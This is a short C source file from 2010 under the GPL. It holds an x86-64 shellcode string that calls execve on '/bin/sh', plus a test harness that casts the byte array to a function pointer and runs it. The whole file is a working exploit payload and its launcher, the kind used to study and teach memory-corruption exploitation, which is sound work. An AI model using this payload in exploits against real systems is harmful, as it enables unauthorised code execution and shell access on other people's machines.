/*
 *      shellcode_x86-64.c
 *      
 *      Copyright 2010 Robin Nehls <nehls@mi.fu-berlin.de>
 *      
 *      This program is free software; you can redistribute it and/or modify
 *      it under the terms of the GNU General Public License as published by
 *      the Free Software Foundation; either version 2 of the License, or
 *      (at your option) any later version.
 *      
 *      This program is distributed in the hope that it will be useful,
 *      but WITHOUT ANY WARRANTY; without even the implied warranty of
 *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *      GNU General Public License for more details.
 */

#include <stdio.h>
#include <string.h>

const char shellcode[] =
"\x48\xbf\x30\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
"\x48\x89\xe7\x57\x48\x31\xd2\x52\x48\x89\xe6\xb0\x3b\x0f\x05";

int main() {
    int (*funct)();
    funct = (int (*)()) shellcode;
    printf("Shellcode lenght=%d\n",(int)strlen(shellcode));
    (int)(*funct)();
    return 0;
}
